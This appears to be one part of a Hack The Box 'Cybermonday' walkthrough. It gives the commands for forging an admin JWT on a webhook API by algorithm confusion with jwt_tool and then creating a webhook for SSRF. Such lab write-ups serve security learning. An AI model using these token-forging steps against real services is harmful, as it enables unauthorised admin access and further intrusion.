# HTB Cybermonday - Webhook API Admin Access

[Initial Enumeration](htb-cybermonday-1-initial-enumeration.md)
[**Webhook API Admin Access**](htb-cybermonday-2-webhook-api-admin.md)
[Obtaining More Info](htb-cybermonday-3-obtaining-more-info.md)
[Gaining a Foothold](htb-cybermonday-4-gaining-a-foothold.md)
[Where to Now?](htb-cybermonday-5-where-to-now.md)
[Reading the Source](htb-cybermonday-6-reading-the-source.md)
[Composing Root Access](htb-cybermonday-7-composing-root-access.md)

Navigating to the link itself just gets us a blank page. But if we go to the base URL (After adding the domain to our `hosts` file) we see a list of endpoints we can use.
```json
{
  "status": "success",
  "message": {
    "routes": {
...
```

First lets try the `GET /webhooks` endpoint. Since the other endpoints need a UUID it might help to see which ones have already been created. 
```shell
$ curl http://webhooks-api-beta.cybermonday.htb/webhooks

{"status":"error","message":"Unauthorized"}
```


So we need authorization for this one. The same seems to be true for the create endpoint. We have the UUID for the webhook from the changelog so lets `POST` to that and see what happens.
```shell
$ curl -X POST http://webhooks-api-beta.cybermonday.htb/webhooks/fda96d32-e8c8-4301-8fb3-c821a316cf77 -H "Content-Type: application/json" -d '{}'

{"status":"error","message":"\"log_name\" not defined"}
```

This must be a `createLogFile` webhook. Sending a `POST` with both the `log_name` and `log_content` fields doesn't seem to get us anything beyond a `Log created` message so lets leave that for now.

The login endpoint has a username and password so lets try some basic credentials like `admin:admin`. No luck there, let's go ahead and create an account for now. Once our account is created and we've logged in we obtain a JWT to use for our requests in the `x-access-token` header. Trying the `GET /webhooks` endpoint again we can now get a list of endpoints but there's only the `createLogFile` endpoint that we used before (unless there are other people also attempting to hack the box). If we try to use `/webhooks/create` however, we find we're still unauthorized. If we [inspect our JWT](https://jwt.io/) we find it holds the following payload:
```json
{
  "typ": "JWT",
  "alg": "RS256"
}
{
  "id": 3,
  "username": "username",
  "role": "user"
}
```

So our role may be what's holding us back here. Since the security algorithm is RS256 the server may be open to an algorithm switching attack. First we need the public key our token. Querying the usual paths on the server we find the information in the `/jwks.json` path. From that we can extract the public key. Next we use `jwt_tool` to alter the payload and resign the token. 

First we'll extract the public key from the `jwks.json` file, then tamper with the payload and signature.
```shell
$ python3 ~/tools/jwt_tool/jwt_tool.py <your token> -V -jw jwks.json

Found RSA key factors, generating a public key
[+] kid_0_<timestamp>.pem

$ python3 ~/tools/jwt_tool/jwt_tool.py <your token> -T
$ python3 ~/tools/jwt_tool/jwt_tool.py <token from the above command> -X k -pk <your pem filename>
```

During the second command `jwt_tool` will ask what data you want to tamper with. Skip the header values, then change the `role` value in the payload to `admin`. After this you should have a new (much shorter) JWT that we can now try using to create a new webhook.
```shell
$ curl -X POST http://webhooks-api-beta.cybermonday.htb/webhooks/create \
-H "x-access-token: <your spoofed token>" \
-H "Content-Type: application/json" \
-d '{"description": "ssrf", "name": "ssrfHook", "action": "sendRequest"}'

{"status":"success","message":"Done! Send me a request to execute the action, as the event listener is still being developed.","webhook_uuid":"<webhook id>"}
```

Success! Now lets see what we can get up to with this new endpoint.

Next: [Obtaining More Info](htb-cybermonday-3-obtaining-more-info.md)